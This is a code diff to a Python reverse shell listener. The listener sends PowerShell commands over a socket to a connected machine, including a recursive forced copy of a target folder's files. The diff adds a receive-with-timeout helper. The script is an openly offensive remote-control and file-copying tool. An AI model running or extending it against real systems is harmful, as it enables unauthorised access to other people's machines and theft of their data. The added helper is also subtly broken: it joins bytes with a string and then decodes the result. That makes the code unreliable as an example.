@@ -15,6 +15,27 @@ ls $target
 Copy-Item -Path $target\\* -Destination $destinationFolder -recurse -Force
 Write-Host "The file sync is complete." """
 
+def recv_timeout(the_socket,timeout=2):
+    the_socket.setblocking(0)
+    total_data=[];data='';begin=time.time()
+    while 1:
+        #if you got some data, then break after wait sec
+        if total_data and time.time()-begin>timeout:
+            break
+        #if you got no data at all, wait a little longer
+        elif time.time()-begin>timeout*2:
+            break
+        try:
+            data=the_socket.recv(8192)
+            if data:
+                total_data.append(data)
+                begin=time.time()
+            else:
+                time.sleep(0.1)
+        except:
+            pass
+    return ''.join(total_data)
+
 def reverse_shell_listener():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create our socket handler.
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) ;# Set is so that when we cancel out we can reuse port.
@@ -29,9 +50,7 @@ def reverse_shell_listener():
 		for line in codelines:
 			print("Sending: " + line)
 			conn.send(bytes(line + "\n\r", "UTF-8")) # Send shell command.
-			data = conn.recv(4096).decode("UTF-8") # Receive output from command.
-			while("PS C:\\Users\\rober>" not in data):
-				data = conn.recv(4096).decode("UTF-8") # Receive output from command.
+			data = recv_timeout(conn).decode("UTF-8") # Receive output from command.
 			print(data) # Print the output of the command.
 	except KeyboardInterrupt: 
 		print("...listener terminated using [ctrl+c], Shutting down!")
